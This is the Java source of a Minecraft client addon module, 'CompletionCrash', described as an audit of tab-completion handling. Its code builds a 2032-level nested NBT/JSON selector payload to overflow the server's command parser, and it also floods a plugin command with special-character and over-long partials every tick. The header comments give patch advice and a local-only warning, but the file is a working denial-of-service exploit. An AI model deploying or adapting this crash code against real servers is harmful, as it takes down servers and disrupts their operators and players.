package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;


/**
 * AUDIT: Completion Crash (tab-complete parser & plugin handler)
 *
 * PLATFORM: Bukkit-universal (NESTED_JSON targets the server parser; PLUGIN_FUZZ
 * targets plugin onTabComplete / TabCompleteEvent handlers).
 *
 * Two modes against the tab-completion path:
 *   NESTED_JSON  — one-shot: a RequestCommandCompletionsC2SPacket whose argument
 *                  carries a deeply-nested JSON array inside an NBT selector. The
 *                  parser must recurse to evaluate candidates; without a depth cap
 *                  it overflows the stack / burns CPU before the permission check.
 *   PLUGIN_FUZZ  — continuous: completion requests for a plugin command prefix with
 *                  special-character and over-long partials. These reach the
 *                  plugin's tab-complete handler (which runs on the main thread on
 *                  Bukkit) with input the author may not have sanitized.
 *
 * Patch signal: cap SNBT/JSON nesting depth and total argument length during
 * tab-completion BEFORE selector/command evaluation; and in plugins, treat the
 * partial-argument array in onTabComplete as untrusted input (bound length, handle
 * exceptions) rather than feeding it straight into parsers or lookups.
 *
 * Run against your OWN local server only.
 */
public class CompletionCrash extends Module {
    public enum Mode { NESTED_JSON, PLUGIN_FUZZ }

    // char-filter-safe special partials that reach plugin tab-complete handlers
    private static final String[] FUZZ = {
        "'", "\"", "`", "${}", "%s", "%n", "../", "{nbt}", "[]", "()", "<>", "&&", "|", ";",
        "0x", "1e999", "9".repeat(120), "a".repeat(120), "ａ",
    };

    private final SettingGroup sgGeneral = settings.createGroup("Rate");

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").description("NESTED_JSON = one-shot parser overflow; PLUGIN_FUZZ = special-char partials at a plugin command.")
        .defaultValue(Mode.NESTED_JSON).build()
    );
    private final Setting<String> fuzzBase = sgGeneral.add(new StringSetting.Builder()
        .name("fuzz-base").description("Command prefix the PLUGIN_FUZZ partials complete against (no leading slash).")
        .defaultValue("shop ").visible(() -> mode.get() == Mode.PLUGIN_FUZZ).build()
    );
    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(3).min(1).sliderMax(12).build()
    );

    private final GracefulResponse gr = new GracefulResponse(sgGeneral);
    private boolean fired = false;
    private int waitTicks = 0, fuzzIdx = 0, completionId = 0;

    public CompletionCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "completion-crash",
            "Tab-completion parser overflow (nested JSON) or special-char partials at a plugin command. Tests the server parser and plugin tab-complete handlers.");
    }

    @Override
    public void onActivate() { fired = false; waitTicks = 0; fuzzIdx = 0; completionId = 0; gr.onActivate(); }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        gr.tick();

        if (mode.get() == Mode.PLUGIN_FUZZ) {
            for (int i = 0; i < packets.get(); i++) {
                String partial = fuzzBase.get() + FUZZ[fuzzIdx % FUZZ.length];
                fuzzIdx++;
                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(completionId++, partial));
            }
            gr.markFired();
            return;
        }

        if (!fired) {
            String overflow = generateNestedJson(2032);
            String cmd = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
            for (int i = 0; i < packets.get(); i++) {
                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, cmd));
            }
            gr.markFired();
            fired = true;
            waitTicks = 40; // wait ~2s for a kick/response before grading
            return;
        }
        if (--waitTicks <= 0) {
            gr.report(l -> info("%s", l));
            toggle();
        }
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (isActive()) toggle();
    }

    private static String generateNestedJson(int levels) {
        StringBuilder sb = new StringBuilder("{a:");
        for (int i = 0; i < levels; i++) sb.append('[');
        for (int i = 0; i < levels; i++) sb.append(']');
        sb.append('}');
        return sb.toString();
    }
}
